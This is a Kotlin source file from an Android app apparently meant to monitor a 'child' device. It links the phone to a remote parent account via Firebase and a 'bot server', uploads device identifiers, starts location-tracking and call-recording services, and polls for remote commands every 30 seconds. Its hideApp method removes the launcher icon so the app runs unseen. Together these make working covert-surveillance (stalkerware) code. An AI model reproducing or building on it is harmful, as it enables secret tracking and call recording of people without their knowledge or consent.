package com.abuzahra.tracker

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import android.util.Log
import android.webkit.JavascriptInterface
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.FirebaseFirestoreException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await
import com.abuzahra.tracker.services.MainTrackerService
import com.abuzahra.tracker.services.CallRecorderService
import com.abuzahra.tracker.services.DataSyncWorker

/**
 * ChildWebInterface - واجهة الويب لربط JavaScript بـ Android
 * يتعامل مع:
 * 1. ربط الجهاز بـ Firebase (النظام القديم)
 * 2. تسجيل الجهاز في سيرفر البوت (النظام الجديد)
 * 3. بدء جميع الخدمات
 * 4. إخفاء التطبيق
 */
class ChildWebInterface(private val mContext: Context) {
    private val auth = FirebaseAuth.getInstance()
    private val db = FirebaseFirestore.getInstance()

    @JavascriptInterface
    fun linkDevice(code: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                // === الخطوة 1: التحقق من كود الربط في Firebase ===
                val doc = db.collection("linking_codes").document(code).get().await()
                if (!doc.exists()) {
                    sendResult("window.onLinkError('الكود غير صحيح.')")
                    return@launch
                }

                val parentUid = doc.getString("parent_uid")
                if (parentUid.isNullOrEmpty()) {
                    sendResult("window.onLinkError('خطأ في البيانات.')")
                    return@launch
                }

                // === الخطوة 2: المصادقة المجهولة ===
                if (auth.currentUser == null) {
                    try {
                        auth.signInAnonymously().await()
                    } catch (e: Exception) {
                        sendResult("window.onLinkError('فشل المصادقة.')")
                        return@launch
                    }
                }

                // === الخطوة 3: حفظ بيانات الجهاز في Firebase ===
                val deviceId = Settings.Secure.getString(mContext.contentResolver, Settings.Secure.ANDROID_ID)
                val deviceName = Build.MODEL
                val brand = Build.BRAND
                val osVersion = "Android ${Build.VERSION.RELEASE}"

                val deviceData = mapOf(
                    "device_id" to deviceId,
                    "last_seen" to System.currentTimeMillis(),
                    "app_name" to "Child Device",
                    "device_model" to deviceName,
                    "brand" to brand,
                    "os_version" to osVersion
                )

                try {
                    db.collection("parents").document(parentUid)
                        .collection("children").document(deviceId)
                        .set(deviceData).await()
                } catch (e: FirebaseFirestoreException) {
                    sendResult("window.onLinkError('اضغط PUBLISH في قواعد Firebase.')")
                    return@launch
                }

                // حذف كود الربط
                db.collection("linking_codes").document(code).delete().await()

                // حفظ بيانات الربط محلياً
                SharedPrefsManager.saveData(mContext, parentUid, deviceId)
                SharedPrefsManager.setLinkCode(mContext, code)

                // === الخطوة 4: تسجيل الجهاز في سيرفر البوت ===
                try {
                    val registered = BotServerClient.registerDevice(mContext, code)
                    if (registered) {
                        Log.d("ChildApp", "تم تسجيل الجهاز في سيرفر البوت بنجاح")
                    } else {
                        Log.w("ChildApp", "فشل تسجيل الجهاز في سيرفر البوت - سيتم المحاولة لاحقاً")
                    }
                } catch (e: Exception) {
                    Log.e("ChildApp", "خطأ في تسجيل سيرفر البوت: ${e.message}")
                    // لا نمنع الربط إذا فشل تسجيل البوت - Firebase يعمل كبديل
                }

                // === الخطوة 5: بدء جميع الخدمات ===
                startAllServices()

                sendResult("window.onLinkSuccess()")

            } catch (e: Exception) {
                sendResult("window.onLinkError('خطأ: ${e.message}')")
            }
        }
    }

    @JavascriptInterface
    fun startServices() {
        startAllServices()
        // محاولة تسجيل الجهاز في سيرفر البوت إذا لم يتم تسجيله
        val linkCode = SharedPrefsManager.getLinkCode(mContext)
        if (linkCode != null && !SharedPrefsManager.isBotRegistered(mContext)) {
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    BotServerClient.registerDevice(mContext, linkCode)
                } catch (e: Exception) {
                    Log.e("ChildApp", "خطأ في إعادة تسجيل البوت: ${e.message}")
                }
            }
        }
    }

    @JavascriptInterface
    fun hideApp() {
        Log.d("ChildApp", "Hide App Button Clicked")

        try {
            val pkg = mContext.packageManager
            val aliasName = ComponentName(mContext, mContext.packageName + ".LauncherAlias")

            Log.d("ChildApp", "Attempting to disable: " + aliasName.flattenToString())

            // إخفاء الأيقونة
            pkg.setComponentEnabledSetting(
                aliasName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )

            sendResult("window.onAppHidden()")

            (mContext as MainActivity).finish()

        } catch (e: Exception) {
            Log.e("ChildApp", "Failed to hide app", e)
            sendResult("window.onAppError('${e.message}')")
        }
    }

    /**
     * بدء جميع الخدمات (التتبع، تسجيل المكالمات، مزامنة البيانات)
     */
    private fun startAllServices() {
        // خدمة التتبع الرئيسية
        val intent = Intent(mContext, MainTrackerService::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            mContext.startForegroundService(intent)
        } else {
            mContext.startService(intent)
        }

        // خدمة تسجيل المكالمات
        val recIntent = Intent(mContext, CallRecorderService::class.java)
        recIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            mContext.startForegroundService(recIntent)
        } else {
            mContext.startService(recIntent)
        }

        // بدء مزامنة البيانات (التحقق من الأوامر كل 30 ثانية)
        DataSyncWorker.startImmediate(mContext)
    }

    private fun sendResult(js: String) {
        CoroutineScope(Dispatchers.Main).launch {
            (mContext as MainActivity).webView.evaluateJavascript(js, null)
        }
    }
}
